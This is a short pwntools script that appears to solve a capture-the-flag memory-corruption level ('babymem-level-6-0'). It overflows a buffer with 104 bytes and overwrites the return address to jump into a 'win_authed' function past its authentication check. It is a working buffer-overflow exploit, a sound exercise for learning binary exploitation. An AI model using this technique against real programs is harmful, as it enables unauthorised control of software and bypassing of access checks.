from pwn import *


offset = 104
proc = process('/challenge/babymem-level-6-0')
elf = ELF('/challenge/babymem-level-6-0')

proc.recv()
# offset to RET + address win_authed
size = offset + 8
proc.sendline(str(size).encode())
proc.recv()
# win_authed on jne to bypass conntrol
paylaod = b'A' * offset + p64(0x401f2b)
proc.sendline(paylaod)
proc.interactive()
